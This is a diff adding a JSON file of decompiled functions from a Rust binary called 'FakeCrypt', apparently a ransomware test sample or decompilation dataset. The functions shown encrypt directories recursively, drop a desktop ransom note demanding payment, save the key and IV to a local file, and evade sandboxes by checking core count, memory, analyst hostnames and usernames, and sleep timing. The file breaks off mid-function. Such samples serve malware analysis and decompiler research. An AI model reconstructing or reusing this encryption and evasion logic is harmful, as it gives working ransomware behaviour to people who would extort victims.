@@ -1,0 +1,1124 @@
+{
+  "decompilation": {
+    "_ZN9FakeCrypt7fileops16drop_ransom_note17h4942ecd79881b15cE": "void _ZN9FakeCrypt7fileops16drop_ransom_note17h4942ecd79881b15cE(void)\n\n{\n  undefined8 uVar1;\n  int local_64;\n  int local_60;\n  int iStack_5c;\n  undefined4 uStack_58;\n  undefined4 uStack_54;\n  undefined8 local_50;\n  int local_48;\n  int iStack_44;\n  undefined4 uStack_40;\n  undefined4 uStack_3c;\n  undefined8 local_38;\n  undefined local_28 [24];\n  \n  (*(code *)PTR__ZN4dirs11desktop_dir17h701c4228176dceafE_001dec08)(&local_60);\n  local_38 = local_50;\n  local_48 = local_60;\n  iStack_44 = iStack_5c;\n  uStack_40 = uStack_58;\n  uStack_3c = uStack_54;\n                    /* try { // try from 00155671 to 00155696 has its CatchHandler @ 0015571a */\n  _ZN3std4path4Path4join17h92d580baf012382bE\n            (local_28,CONCAT44(uStack_54,uStack_58),local_50,&DAT_0010b418,0x18);\n  _ZN3std2fs4File6create17h34a10c1ae837220bE(&local_60,local_28);\n  if (local_60 != 1) {\n    local_64 = iStack_5c;\n                    /* try { // try from 001556a8 to 001556c5 has its CatchHandler @ 001556f4 */\n    uVar1 = _ZN3std2io5Write9write_all17h61cad997d75bad86E\n                      (&local_64,\n                       \"\\nYour files have been encrypted.\\n\\nTo recover them, you must pay the ransom.\\n\\nFailure to do so will result in permanent loss of your data.\\n\"\n                       ,0x8a);\n    _ZN4core3ptr81drop_in_place_LT_core__result__Result_LT__LP__RP__C_std__io__error__Error_GT__GT_17h52eca53ec7fb34e8E\n              (uVar1);\n    _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hfc222f4db551af96E(local_64);\n  }\n                    /* try { // try from 001556cf to 001556d8 has its CatchHandler @ 001556ef */\n  _ZN4core3ptr39drop_in_place_LT_std__path__PathBuf_GT_17hff597253ed3a0574E(&local_48);\n  if ((char)local_60 != '\\0') {\n    _ZN4core3ptr86drop_in_place_LT_core__result__Result_LT_std__fs__File_C_std__io__error__Error_GT__GT_17h3f5dd9ad240898e4E\n              (&local_60);\n  }\n  return;\n}",
+    "_ZN9FakeCrypt7fileops17decrypt_directory17h7bfbee2fc08c838dE": "void _ZN9FakeCrypt7fileops17decrypt_directory17h7bfbee2fc08c838dE\n               (undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)\n\n{\n  undefined *puVar1;\n  char cVar2;\n  undefined8 local_120;\n  char local_118;\n  undefined local_110 [8];\n  undefined8 local_108;\n  undefined8 local_100;\n  undefined4 local_f8;\n  undefined4 uStack_f4;\n  undefined4 uStack_f0;\n  undefined4 uStack_ec;\n  undefined4 local_e8;\n  undefined4 uStack_e4;\n  undefined4 uStack_e0;\n  undefined4 uStack_dc;\n  undefined8 local_d8;\n  undefined4 local_c8;\n  undefined4 uStack_c4;\n  undefined4 uStack_c0;\n  undefined4 uStack_bc;\n  undefined4 local_b8;\n  undefined4 uStack_b4;\n  undefined4 uStack_b0;\n  undefined4 uStack_ac;\n  undefined8 local_a8;\n  undefined8 local_a0 [6];\n  undefined8 local_70;\n  undefined8 local_40;\n  char local_38;\n  \n  _ZN3std2fs8read_dir17ha0facb67eaa83156E(&local_120,param_1,param_2);\n  puVar1 = PTR__ZN3std4path4Path6is_dir17hf801d9cfeb23f5dbE_001deb68;\n  if (local_118 != '\\x02') {\n    local_a0[0] = 0;\n    local_70 = 0;\n    local_40 = local_120;\n    local_38 = local_118;\n                    /* try { // try from 00155500 to 0015550c has its CatchHandler @ 001555e3 */\n    while (_ZN116__LT_core__iter__adapters__flatten__FlattenCompat_LT_I_C_U_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h649188f1314bf01aE\n                     (&local_c8,local_a0), CONCAT44(uStack_c4,local_c8) != 0) {\n      local_d8 = local_a8;\n      local_e8 = local_b8;\n      uStack_e4 = uStack_b4;\n      uStack_e0 = uStack_b0;\n      uStack_dc = uStack_ac;\n      local_f8 = local_c8;\n      uStack_f4 = uStack_c4;\n      uStack_f0 = uStack_c0;\n      uStack_ec = uStack_bc;\n                    /* try { // try from 00155536 to 00155541 has its CatchHandler @ 001555d4 */\n      (*(code *)PTR__ZN3std2fs8DirEntry4path17h0d0e35cdc38feba2E_001dec00)(local_110,&local_f8);\n                    /* try { // try from 0015554c to 0015557a has its CatchHandler @ 001555c5 */\n      cVar2 = (*(code *)puVar1)(local_108,local_100);\n      if (cVar2 == '\\0') {\n        _ZN9FakeCrypt7fileops12decrypt_file17h141057e80aed468cE(local_108,local_100,param_3,param_4)\n        ;\n      }\n      else {\n        _ZN9FakeCrypt7fileops17decrypt_directory17h7bfbee2fc08c838dE\n                  (local_108,local_100,param_3,param_4);\n      }\n                    /* try { // try from 0015557b to 00155582 has its CatchHandler @ 001555d4 */\n      _ZN4core3ptr39drop_in_place_LT_std__path__PathBuf_GT_17hff597253ed3a0574E(local_110);\n                    /* try { // try from 00155583 to 0015558a has its CatchHandler @ 001555e3 */\n      _ZN4core3ptr38drop_in_place_LT_std__fs__DirEntry_GT_17h51ac40c013d79d1eE(&local_f8);\n    }\n                    /* try { // try from 00155590 to 0015559c has its CatchHandler @ 001555c0 */\n    _ZN4core3ptr83drop_in_place_LT_core__iter__adapters__flatten__Flatten_LT_std__fs__ReadDir_GT__GT_17h0f0420560c044b1bE\n              (local_a0);\n    if (local_118 != '\\x02') {\n      return;\n    }\n  }\n  _ZN4core3ptr89drop_in_place_LT_core__result__Result_LT_std__fs__ReadDir_C_std__io__error__Error_GT__GT_17h798bf9b3fb5da4e8E\n            (&local_120);\n  return;\n}",
+    "_ZN9FakeCrypt7fileops17encrypt_directory17hb6c6db8e2661d1b6E": "void _ZN9FakeCrypt7fileops17encrypt_directory17hb6c6db8e2661d1b6E\n               (undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)\n\n{\n  undefined *puVar1;\n  char cVar2;\n  undefined8 local_120;\n  char local_118;\n  undefined local_110 [8];\n  undefined8 local_108;\n  undefined8 local_100;\n  undefined4 local_f8;\n  undefined4 uStack_f4;\n  undefined4 uStack_f0;\n  undefined4 uStack_ec;\n  undefined4 local_e8;\n  undefined4 uStack_e4;\n  undefined4 uStack_e0;\n  undefined4 uStack_dc;\n  undefined8 local_d8;\n  undefined4 local_c8;\n  undefined4 uStack_c4;\n  undefined4 uStack_c0;\n  undefined4 uStack_bc;\n  undefined4 local_b8;\n  undefined4 uStack_b4;\n  undefined4 uStack_b0;\n  undefined4 uStack_ac;\n  undefined8 local_a8;\n  undefined8 local_a0 [6];\n  undefined8 local_70;\n  undefined8 local_40;\n  char local_38;\n  \n  _ZN3std2fs8read_dir17ha0facb67eaa83156E(&local_120,param_1,param_2);\n  puVar1 = PTR__ZN3std4path4Path6is_dir17hf801d9cfeb23f5dbE_001deb68;\n  if (local_118 != '\\x02') {\n    local_a0[0] = 0;\n    local_70 = 0;\n    local_40 = local_120;\n    local_38 = local_118;\n                    /* try { // try from 00155360 to 0015536c has its CatchHandler @ 00155443 */\n    while (_ZN116__LT_core__iter__adapters__flatten__FlattenCompat_LT_I_C_U_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h649188f1314bf01aE\n                     (&local_c8,local_a0), CONCAT44(uStack_c4,local_c8) != 0) {\n      local_d8 = local_a8;\n      local_e8 = local_b8;\n      uStack_e4 = uStack_b4;\n      uStack_e0 = uStack_b0;\n      uStack_dc = uStack_ac;\n      local_f8 = local_c8;\n      uStack_f4 = uStack_c4;\n      uStack_f0 = uStack_c0;\n      uStack_ec = uStack_bc;\n                    /* try { // try from 00155396 to 001553a1 has its CatchHandler @ 00155434 */\n      (*(code *)PTR__ZN3std2fs8DirEntry4path17h0d0e35cdc38feba2E_001dec00)(local_110,&local_f8);\n                    /* try { // try from 001553ac to 001553da has its CatchHandler @ 00155425 */\n      cVar2 = (*(code *)puVar1)(local_108,local_100);\n      if (cVar2 == '\\0') {\n        _ZN9FakeCrypt7fileops12encrypt_file17ha7bc1626977de376E(local_108,local_100,param_3,param_4)\n        ;\n      }\n      else {\n        _ZN9FakeCrypt7fileops17encrypt_directory17hb6c6db8e2661d1b6E\n                  (local_108,local_100,param_3,param_4);\n      }\n                    /* try { // try from 001553db to 001553e2 has its CatchHandler @ 00155434 */\n      _ZN4core3ptr39drop_in_place_LT_std__path__PathBuf_GT_17hff597253ed3a0574E(local_110);\n                    /* try { // try from 001553e3 to 001553ea has its CatchHandler @ 00155443 */\n      _ZN4core3ptr38drop_in_place_LT_std__fs__DirEntry_GT_17h51ac40c013d79d1eE(&local_f8);\n    }\n                    /* try { // try from 001553f0 to 001553fc has its CatchHandler @ 00155420 */\n    _ZN4core3ptr83drop_in_place_LT_core__iter__adapters__flatten__Flatten_LT_std__fs__ReadDir_GT__GT_17h0f0420560c044b1bE\n              (local_a0);\n    if (local_118 != '\\x02') {\n      return;\n    }\n  }\n  _ZN4core3ptr89drop_in_place_LT_core__result__Result_LT_std__fs__ReadDir_C_std__io__error__Error_GT__GT_17h798bf9b3fb5da4e8E\n            (&local_120);\n  return;\n}",
+    "_ZN9FakeCrypt4main17h8f6c4810655a0166E": "void _ZN9FakeCrypt4main17h8f6c4810655a0166E(void)\n\n{\n  undefined ***pppuVar1;\n  undefined8 **ppuVar2;\n  undefined8 **ppuVar3;\n  undefined8 **ppuVar4;\n  code *pcVar5;\n  undefined5 uVar6;\n  char cVar7;\n  undefined4 uVar8;\n  undefined8 uVar9;\n  undefined4 *puVar10;\n  undefined **ppuVar11;\n  bool bVar12;\n  undefined auVar13 [16];\n  undefined ***local_168;\n  undefined8 *local_160;\n  undefined8 **local_158;\n  code *pcStack_150;\n  undefined8 local_148;\n  undefined8 uStack_140;\n  undefined **local_130;\n  code *local_128;\n  undefined8 *local_120;\n  undefined local_118;\n  undefined4 uStack_117;\n  undefined4 uStack_113;\n  undefined4 uStack_10f;\n  undefined4 uStack_10b;\n  undefined7 uStack_107;\n  undefined uStack_100;\n  undefined7 uStack_ff;\n  undefined uStack_f8;\n  undefined7 uStack_f7;\n  undefined *local_68;\n  undefined *puStack_60;\n  undefined8 local_50 [2];\n  undefined local_40 [8];\n  undefined8 **local_38;\n  long local_30;\n  undefined8 **local_28;\n  \n  cVar7 = _ZN9FakeCrypt7stealth10is_sandbox17hafd329d2780dcab4E();\n  if (cVar7 == '\\0') {\n    (*(code *)PTR__ZN3std3env4args17h2d42d299febd4730E_001deb60)(&local_118);\n    _ZN4core4iter6traits8iterator8Iterator7collect17he4dd0fa351f6ca31E(local_40,&local_118);\n    ppuVar4 = local_38;\n    if (local_30 != 3) goto LAB_00154042;\n    local_28 = local_38 + 6;\n    pppuVar1 = (undefined ***)local_38[7];\n    ppuVar2 = (undefined8 **)local_38[8];\n                    /* try { // try from 00153afa to 00153b65 has its CatchHandler @ 001541c5 */\n    _ZN3std2fs8metadata17h0760d7be52d610f8E(&local_118,pppuVar1,ppuVar2);\n    uVar6 = CONCAT41(uStack_117,local_118);\n    _ZN4core3ptr90drop_in_place_LT_core__result__Result_LT_std__fs__Metadata_C_std__io__error__Error_GT__GT_17h18de0bccda4629aaE\n              (&local_118);\n    if ((int)uVar6 == 2) {\nLAB_00153fac:\n      local_158 = &local_28;\n      pcStack_150 = _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17h983fa18a9adfd763E;\n      local_118 = 0x80;\n      uStack_117 = 0x1d93;\n      uStack_113 = 0x2000000;\n      uStack_10f = 0;\n      uStack_f8 = 0;\n      uStack_f7 = 0;\n      uStack_10b._3_1_ = (byte)&local_158;\n      uStack_10b = (uint)uStack_10b._3_1_ << 0x18;\n      uStack_107 = (undefined7)((ulong)&local_158 >> 8);\n      uStack_100 = 1;\n      uStack_ff = 0;\n                    /* try { // try from 00153ff6 to 00154000 has its CatchHandler @ 001541c5 */\n      (*(code *)PTR__ZN3std2io5stdio7_eprint17hc8807d5917a19629E_001deb90)(&local_118);\n      goto LAB_0015417c;\n    }\n    cVar7 = (*(code *)PTR__ZN3std4path4Path6is_dir17hf801d9cfeb23f5dbE_001deb68)(pppuVar1,ppuVar2);\n    if (cVar7 == '\\0') goto LAB_00153fac;\n    ppuVar3 = (undefined8 **)ppuVar4[4];\n    ppuVar4 = (undefined8 **)ppuVar4[5];\n    cVar7 = _ZN73__LT__u5b_A_u5d__u20_as_u20_core__slice__cmp__SlicePartialEq_LT_B_GT__GT_5equal17h4c5daeced03dccc4E\n                      (ppuVar3,ppuVar4,&DAT_0010b0c9,7);\n    if (cVar7 != '\\0') {\n      local_50[0] = (*(code *)PTR__ZN4rand4rngs6thread10thread_rng17h09fbc33fa767c893E_001deb70)();\n      local_148 = 0;\n      uStack_140 = 0;\n      local_158 = (undefined8 **)0x0;\n      pcStack_150 = (code *)0x0;\n      local_68 = (undefined *)0x0;\n      puStack_60 = (undefined *)0x0;\n                    /* try { // try from 00153b83 to 00153c83 has its CatchHandler @ 001541a4 */\n      _ZN4rand3rng3Rng4fill17h6622a59cfa54218dE(local_50,&local_158);\n      _ZN4rand3rng3Rng4fill17hc443b30d36d1a142E(local_50,&local_68);\n      local_160 = (undefined8 *)\n                  PTR__ZN57__LT_std__path__Display_u20_as_u20_core__fmt__Display_GT_3fmt17h30f11f8aadf82eb7E_001deb78\n      ;\n      local_118 = 0xa0;\n      uStack_117 = 0x1d93;\n      uStack_113 = 0x2000000;\n      uStack_10f = 0;\n      uStack_f8 = 0;\n      uStack_f7 = 0;\n      uStack_10b._3_1_ = (byte)&local_168;\n      uStack_10b = (uint)uStack_10b._3_1_ << 0x18;\n      uStack_107 = (undefined7)((ulong)&local_168 >> 8);\n      uStack_100 = 1;\n      uStack_ff = 0;\n      local_168 = &local_130;\n      local_130 = (undefined **)pppuVar1;\n      local_128 = (code *)ppuVar2;\n      (*(code *)PTR__ZN3std2io5stdio6_print17h5b6764aa60c7b687E_001deb80)(&local_118);\n      _ZN9FakeCrypt7fileops17encrypt_directory17hb6c6db8e2661d1b6E\n                (pppuVar1,ppuVar2,&local_158,&local_68);\n      local_118 = 0xc0;\n      uStack_117 = 0x1d93;\n      uStack_113 = 0x1000000;\n      uStack_10f = 0;\n      uStack_10b = 0x8000000;\n      uStack_107 = 0;\n      uStack_100 = 0;\n      uStack_ff = 0;\n      uStack_f8 = 0;\n      uStack_f7 = 0;\n      (*(code *)PTR__ZN3std2io5stdio6_print17h5b6764aa60c7b687E_001deb80)(&local_118);\n      _ZN9FakeCrypt7fileops16drop_ransom_note17h4942ecd79881b15cE();\n      _ZN3std2fs4File6create17h5c1de6a00e2586b5E(&local_118,\"keyinfo.bin\",0xb);\n      uVar8 = _ZN4core6result19Result_LT_T_C_E_GT_6expect17hfc66c8e2754ad5d3E\n                        (&local_118,\"Failed to create key file\",0x19,&PTR_s_src_main_rs_001d9518);\n      local_168 = (undefined ***)CONCAT44(local_168._4_4_,uVar8);\n                    /* try { // try from 00153c87 to 00153d32 has its CatchHandler @ 00154197 */\n      uVar9 = _ZN3std2io5Write9write_all17h61cad997d75bad86E(&local_168,&local_158,0x20);\n      _ZN4core6result19Result_LT_T_C_E_GT_6expect17hb04c0fd579f5cc61E\n                (uVar9,\"Failed to write key\",0x13,&PTR_s_src_main_rs_001d9530);\n      uVar9 = _ZN3std2io5Write9write_all17h61cad997d75bad86E(&local_168,&local_68,0x10);\n      _ZN4core6result19Result_LT_T_C_E_GT_6expect17hb04c0fd579f5cc61E\n                (uVar9,\"Failed to write IV\",0x12,&PTR_s_src_main_rs_001d9548);\n      local_130 = &PTR_s_keyinfo_bin_001d9478;\n      local_128 = _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17hc366d3db5c7a9bb3E;\n      local_118 = 0xd0;\n      uStack_117 = 0x1d93;\n      uStack_113 = 0x2000000;\n      uStack_10f = 0;\n      uStack_f8 = 0;\n      uStack_f7 = 0;\n      uStack_10b._3_1_ = (byte)&local_130;\n      uStack_10b = (uint)uStack_10b._3_1_ << 0x18;\n      uStack_107 = (undefined7)((ulong)&local_130 >> 8);\n      uStack_100 = 1;\n      uStack_ff = 0;\n      (*(code *)PTR__ZN3std2io5stdio6_print17h5b6764aa60c7b687E_001deb80)(&local_118);\n      _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hfc222f4db551af96E((int)local_168);\n                    /* try { // try from 00153d3b to 00153dbf has its CatchHandler @ 001541c5 */\n      _ZN4core3ptr50drop_in_place_LT_rand__rngs__thread__ThreadRng_GT_17hb2ae31cd1a8c8c1aE(local_50)\n      ;\nLAB_00153f90:\n      _ZN4core3ptr65drop_in_place_LT_alloc__vec__Vec_LT_alloc__string__String_GT__GT_17h454a48ed0cb28b12E\n                (local_40);\n      return;\n    }\n    cVar7 = _ZN73__LT__u5b_A_u5d__u20_as_u20_core__slice__cmp__SlicePartialEq_LT_B_GT__GT_5equal17h4c5daeced03dccc4E\n                      (ppuVar3,ppuVar4,&DAT_0010b0d0,7);\n    if (cVar7 != '\\0') {\n      local_158 = (undefined8 **)&PTR_s_keyinfo_bin_001d9478;\n      pcStack_150 = _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17hc366d3db5c7a9bb3E;\n      local_118 = 0xf0;\n      uStack_117 = 0x1d93;\n      uStack_113 = 0x2000000;\n      uStack_10f = 0;\n      uStack_f8 = 0;\n      uStack_f7 = 0;\n      uStack_10b._3_1_ = (byte)&local_158;\n      uStack_10b = (uint)uStack_10b._3_1_ << 0x18;\n      uStack_107 = (undefined7)((ulong)&local_158 >> 8);\n      uStack_100 = 1;\n      uStack_ff = 0;\n      (*(code *)PTR__ZN3std2io5stdio6_print17h5b6764aa60c7b687E_001deb80)(&local_118);\n      local_130 = (undefined **)0x0;\n      local_128 = (code *)0x1;\n      local_120 = (undefined ***)0x0;\n                    /* try { // try from 00153ddb to 00153e0d has its CatchHandler @ 001541b6 */\n      _ZN3std2fs4File4open17hfe7e6621c8fb380dE(&local_118,\"keyinfo.bin\",0xb);\n      uVar8 = _ZN4core6result19Result_LT_T_C_E_GT_6expect17hfc66c8e2754ad5d3E\n                        (&local_118,\"Could not open key file\",0x17,&PTR_s_src_main_rs_001d9488);\n      local_158 = (undefined8 **)CONCAT44(local_158._4_4_,uVar8);\n                    /* try { // try from 00153e12 to 00153e2f has its CatchHandler @ 00154189 */\n      auVar13 = (*(code *)\n                  PTR__ZN47__LT_std__fs__File_u20_as_u20_std__io__Read_GT_11read_to_end17h0619605a8d236003E_001deb88\n                )(&local_158,&local_130);\n      _ZN4core6result19Result_LT_T_C_E_GT_6expect17h6cf4cd195f2db86fE(auVar13._0_8_,auVar13._8_8_);\n      _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hfc222f4db551af96E((int)local_158);\n      if ((undefined ***)local_120 == (undefined ***)0x30) {\n                    /* try { // try from 00153e4d to 00153f85 has its CatchHandler @ 001541b6 */\n        auVar13 = _ZN106__LT_core__ops__range__Range_LT_usize_GT__u20_as_u20_core__slice__index__SliceIndex_LT__u5b_T_u5d__GT__GT_5index17h87c96b7bc7cc52f1E\n                            (0,0x20,local_128,0x30,&PTR_s_src_main_rs_001d94b8);\n        puVar10 = auVar13._0_8_;\n        bVar12 = auVar13._8_8_ == 0x20;\n        if (bVar12) {\n          uStack_117 = *puVar10;\n          uStack_113 = puVar10[1];\n          uStack_10f = puVar10[2];\n          uStack_10b = puVar10[3];\n          uStack_107 = (undefined7)*(undefined8 *)(puVar10 + 4);\n          uStack_100 = (undefined)((ulong)*(undefined8 *)(puVar10 + 4) >> 0x38);\n          uStack_ff = (undefined7)*(undefined8 *)(puVar10 + 6);\n          uStack_f8 = (undefined)((ulong)*(undefined8 *)(puVar10 + 6) >> 0x38);\n        }\n        local_118 = !bVar12;\n        _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17hdbcd3828175a306dE(&local_158,&local_118);\n        auVar13 = _ZN106__LT_core__ops__range__Range_LT_usize_GT__u20_as_u20_core__slice__index__SliceIndex_LT__u5b_T_u5d__GT__GT_5index17h87c96b7bc7cc52f1E\n                            (0x20,0x30,local_128,local_120,&PTR_s_src_main_rs_001d94e8);\n        puVar10 = auVar13._0_8_;\n        bVar12 = auVar13._8_8_ == 0x10;\n        if (bVar12) {\n          uStack_117 = *puVar10;\n          uStack_113 = puVar10[1];\n          uStack_10f = puVar10[2];\n          uStack_10b = puVar10[3];\n        }\n        local_118 = !bVar12;\n        _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17hd6fa3a1b256db820E(local_50,&local_118);\n        puStack_60 = \n        PTR__ZN57__LT_std__path__Display_u20_as_u20_core__fmt__Display_GT_3fmt17h30f11f8aadf82eb7E_001deb78\n        ;\n        local_118 = 0x30;\n        uStack_117 = 0x1d94;\n        uStack_113 = 0x2000000;\n        uStack_10f = 0;\n        uStack_f8 = 0;\n        uStack_f7 = 0;\n        uStack_10b._3_1_ = (byte)&local_68;\n        uStack_10b = (uint)uStack_10b._3_1_ << 0x18;\n        uStack_107 = (undefined7)((ulong)&local_68 >> 8);\n        uStack_100 = 1;\n        uStack_ff = 0;\n        local_168 = pppuVar1;\n        local_160 = ppuVar2;\n        local_68 = (undefined *)&local_168;\n        (*(code *)PTR__ZN3std2io5stdio6_print17h5b6764aa60c7b687E_001deb80)(&local_118);\n        _ZN9FakeCrypt7fileops17decrypt_directory17h7bfbee2fc08c838dE\n                  (pppuVar1,ppuVar2,&local_158,local_50);\n        local_118 = 0x50;\n        uStack_117 = 0x1d94;\n        uStack_113 = 0x1000000;\n        uStack_10f = 0;\n        uStack_10b = 0x8000000;\n        uStack_107 = 0;\n        uStack_100 = 0;\n        uStack_ff = 0;\n        uStack_f8 = 0;\n        uStack_f7 = 0;\n        (*(code *)PTR__ZN3std2io5stdio6_print17h5b6764aa60c7b687E_001deb80)(&local_118);\n                    /* try { // try from 00153f86 to 00153f8f has its CatchHandler @ 001541c5 */\n        _ZN4core3ptr46drop_in_place_LT_alloc__vec__Vec_LT_u8_GT__GT_17h0777b7bfa8327074E(&local_130)\n        ;\n        goto LAB_00153f90;\n      }\n      local_168 = (undefined ***)local_120;\n      pcStack_150 = (code *)\n                    PTR__ZN4core3fmt3num3imp52__LT_impl_u20_core__fmt__Display_u20_for_u20_u64_GT_3fmt17h596da7382ae08600E_001deba0\n      ;\n      local_118 = 0x10;\n      uStack_117 = 0x1d94;\n      uStack_113 = 0x2000000;\n      uStack_10f = 0;\n      uStack_f8 = 0;\n      uStack_f7 = 0;\n      uStack_10b._3_1_ = (byte)&local_158;\n      uStack_10b = (uint)uStack_10b._3_1_ << 0x18;\n      uStack_107 = (undefined7)((ulong)&local_158 >> 8);\n      uStack_100 = 1;\n      uStack_ff = 0;\n                    /* try { // try from 0015410f to 00154124 has its CatchHandler @ 001541b6 */\n      local_158 = &local_168;\n      (*(code *)PTR__ZN3std2io5stdio7_eprint17hc8807d5917a19629E_001deb90)(&local_118);\n      (*(code *)PTR__ZN3std7process4exit17ha5a0456f3200bdd3E_001deb98)(1);\n      goto LAB_00154187;\n    }\n    if (local_30 != 0) {\n      local_158 = local_38;\n      pcStack_150 = \n      _ZN60__LT_alloc__string__String_u20_as_u20_core__fmt__Display_GT_3fmt17h8e584e4fe4b805b4E;\n      local_118 = 0x60;\n      uStack_117 = 0x1d93;\n      uStack_113 = 0x2000000;\n      uStack_10f = 0;\n      uStack_f8 = 0;\n      uStack_f7 = 0;\n      uStack_10b._3_1_ = (byte)&local_158;\n      uStack_10b = (uint)uStack_10b._3_1_ << 0x18;\n      uStack_107 = (undefined7)((ulong)&local_158 >> 8);\n      uStack_100 = 1;\n      uStack_ff = 0;\n                    /* try { // try from 00154171 to 00154186 has its CatchHandler @ 001541c5 */\n      (*(code *)PTR__ZN3std2io5stdio7_eprint17hc8807d5917a19629E_001deb90)(&local_118);\n      goto LAB_0015417c;\n    }\n    ppuVar11 = &PTR_s_src_main_rs_001d9460;\n  }\n  else {\n    local_118 = 0x50;\n    uStack_117 = 0x1d93;\n    uStack_113 = 0x1000000;\n    uStack_10f = 0;\n    uStack_10b = 0x8000000;\n    uStack_107 = 0;\n    uStack_100 = 0;\n    uStack_ff = 0;\n    uStack_f8 = 0;\n    uStack_f7 = 0;\n    (*(code *)PTR__ZN3std2io5stdio6_print17h5b6764aa60c7b687E_001deb80)(&local_118);\n    local_30 = (*(code *)PTR__ZN3std7process4exit17ha5a0456f3200bdd3E_001deb98)(1);\nLAB_00154042:\n    if (local_30 != 0) {\n      local_158 = local_38;\n      pcStack_150 = \n      _ZN60__LT_alloc__string__String_u20_as_u20_core__fmt__Display_GT_3fmt17h8e584e4fe4b805b4E;\n      local_118 = 0x60;\n      uStack_117 = 0x1d93;\n      uStack_113 = 0x2000000;\n      uStack_10f = 0;\n      uStack_f8 = 0;\n      uStack_f7 = 0;\n      uStack_10b._3_1_ = (byte)&local_158;\n      uStack_10b = (uint)uStack_10b._3_1_ << 0x18;\n      uStack_107 = (undefined7)((ulong)&local_158 >> 8);\n      uStack_100 = 1;\n      uStack_ff = 0;\n                    /* try { // try from 0015409a to 001540c5 has its CatchHandler @ 001541c5 */\n      (*(code *)PTR__ZN3std2io5stdio7_eprint17hc8807d5917a19629E_001deb90)(&local_118);\nLAB_0015417c:\n      (*(code *)PTR__ZN3std7process4exit17ha5a0456f3200bdd3E_001deb98)(1);\n      goto LAB_00154187;\n    }\n    ppuVar11 = &PTR_s_src_main_rs_001d9560;\n  }\n  (*(code *)PTR__ZN4core9panicking18panic_bounds_check17h9181a23875c77293E_001dea70)(0,0,ppuVar11);\nLAB_00154187:\n                    /* WARNING: Does not return */\n  pcVar5 = (code *)invalidInstructionException();\n  (*pcVar5)();\n}",
+    "_ZN9FakeCrypt7stealth10is_sandbox17hafd329d2780dcab4E": "ulong _ZN9FakeCrypt7stealth10is_sandbox17hafd329d2780dcab4E(void)\n\n{\n  char cVar1;\n  ulong uVar2;\n  undefined7 uVar3;\n  undefined auVar4 [16];\n  undefined auVar5 [12];\n  undefined **local_218;\n  undefined **local_210;\n  undefined8 local_208;\n  undefined local_200 [8];\n  undefined8 local_1f8;\n  undefined8 local_1f0;\n  undefined local_1e8 [24];\n  undefined local_1d0 [360];\n  ulong local_68;\n  \n  (*(code *)PTR__ZN7sysinfo6common6System7new_all17hc9da36646fff1f13E_001deaa8)(local_1d0);\n                    /* try { // try from 00150c26 to 00150c6a has its CatchHandler @ 00150de1 */\n  auVar4 = (*(code *)PTR__ZN7sysinfo6common6System19physical_core_count17hdbb8393c4be371fbE_001deab0\n           )(local_1d0);\n  uVar3 = (undefined7)((ulong)local_1d0 >> 8);\n  uVar2 = CONCAT71(uVar3,1);\n  if ((((auVar4 & (undefined  [16])0x1) != (undefined  [16])0x0) && (1 < auVar4._8_8_)) &&\n     (0x1fffff < local_68)) {\n    (*(code *)PTR__ZN8hostname3get17h3b1635af47d30924E_001deab8)(&local_218);\n    _ZN4core6result19Result_LT_T_C_E_GT_17unwrap_or_default17hf494175ec33b8dd0E\n              (local_200,&local_218);\n                    /* try { // try from 00150c75 to 00150c7d has its CatchHandler @ 00150db4 */\n    (*(code *)PTR__ZN5alloc6string6String15from_utf8_lossy17h6007208a5a0b939dE_001deac0)\n              (&local_218,local_1f8,local_1f0);\n                    /* try { // try from 00150c88 to 00150c92 has its CatchHandler @ 00150da7 */\n    (*(code *)PTR__ZN5alloc3str21__LT_impl_u20_str_GT_12to_lowercase17ha0815f2983b5f9c9E_001dea98)\n              (local_1e8,local_210,local_208);\n                    /* try { // try from 00150c93 to 00150c9a has its CatchHandler @ 00150d98 */\n    _ZN4core3ptr50drop_in_place_LT_alloc__borrow__Cow_LT_str_GT__GT_17h422f01b5a2867946E(&local_218)\n    ;\n                    /* try { // try from 00150c9b to 00150cd8 has its CatchHandler @ 00150dd2 */\n    _ZN4core3ptr47drop_in_place_LT_std__ffi__os_str__OsString_GT_17h7a05ee20b892fddbE(local_200);\n    local_218 = &PTR_s_sandboxmaltest_001d91f0;\n    local_210 = &PTR_s_adminmalware_001d9230;\n    cVar1 = _ZN91__LT_core__slice__iter__Iter_LT_T_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_3any17h26f2523e8bc586faE\n                      (&local_218,local_1e8);\n    if (cVar1 == '\\0') {\n      _ZN6whoami3api8username17h560cc38fa776b431E(&local_218);\n                    /* try { // try from 00150ce3 to 00150ced has its CatchHandler @ 00150d8b */\n      (*(code *)PTR__ZN5alloc3str21__LT_impl_u20_str_GT_12to_lowercase17ha0815f2983b5f9c9E_001dea98)\n                (local_200,local_210,local_208);\n                    /* try { // try from 00150cee to 00150d41 has its CatchHandler @ 00150dc3 */\n      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17ha63171d2b15b0f17E(&local_218);\n      local_218 = &PTR_s_adminmalware_001d9230;\n      local_210 = &PTR_s__root__cargo_registry_src_index__001d9260;\n      cVar1 = _ZN91__LT_core__slice__iter__Iter_LT_T_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_3any17h26f2523e8bc586faE\n                        (&local_218,local_200);\n      if (cVar1 == '\\0') {\n        auVar5 = (*(code *)PTR__ZN3std4time7Instant3now17h2e7a0929984309fcE_001deac8)();\n        local_218 = auVar5._0_8_;\n        local_210 = (undefined **)CONCAT44(local_210._4_4_,auVar5._8_4_);\n        (*(code *)PTR__ZN3std6thread5sleep17h542b9c721528a25aE_001dead0)(2,0);\n        uVar2 = (*(code *)PTR__ZN3std4time7Instant7elapsed17h3ed9b8e557e470d7E_001dead8)(&local_218)\n        ;\n        if (1 < uVar2) {\n                    /* try { // try from 00150d73 to 00150d7c has its CatchHandler @ 00150dd2 */\n          